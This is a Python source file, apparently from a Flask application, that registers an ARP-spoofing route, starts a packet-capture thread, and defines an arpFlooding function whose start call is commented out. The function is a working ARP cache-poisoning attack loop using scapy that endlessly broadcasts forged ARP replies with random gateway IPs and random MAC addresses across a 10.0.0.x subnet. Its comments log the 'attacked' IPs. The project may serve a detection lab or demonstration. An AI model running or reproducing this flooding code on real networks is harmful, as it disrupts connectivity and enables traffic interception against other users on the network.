import threading
import time
import random
from scapy.all import ARP, sendp, Ether
import os

from flask import Flask
from .packetCapture import packetCapture
from .routes.start import main_bp
from .routes.arpSpoofing import arpSpoofing_bp

def create_app():
    app = Flask(__name__)

    app.register_blueprint(main_bp)
    app.register_blueprint(arpSpoofing_bp)

    capture_thread = threading.Thread(target=packetCapture)
    capture_thread.daemon = True
    capture_thread.start()

    spoofing_thread = threading.Thread(target=arpFlooding)
    spoofing_thread.daemon = True
    #spoofing_thread.start()

    return app

import random
import time
from scapy.all import ARP, sendp, Ether

def arpFlooding():
    iface = "en0"  # Ajusta según el sistema
    time.sleep(12)
    print("Iniciando ARP Flooding con IPs variables...")

    packet_count = 0

    while True:
        # 🔹 Generación de direcciones dinámicas
        target_ip = "10.0.0." + str(random.randint(1, 254))
        gateway_ip = "10.0.0." + str(random.randint(1, 254))
        spoofed_mac = ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))

        # 🔹 Bloque ARP Request
        arp_request = ARP(op=1, pdst=target_ip)
        ether_frame_request = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_request

        # 🔹 Bloque ARP Reply
        arp_reply = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwsrc=spoofed_mac)
        ether_frame_reply = Ether(dst="ff:ff:ff:ff:ff:ff") / arp_reply


        # 🔹 Bloque de envío
        sendp(ether_frame_request, iface=iface, verbose=False)
        sendp(ether_frame_reply, iface=iface, verbose=False)

        packet_count += 1

        if packet_count % 200 == 0:
            print(f"Pausa de 20 segundos... Última IP atacada: {target_ip}")
            time.sleep(20)

        time.sleep(0.1)



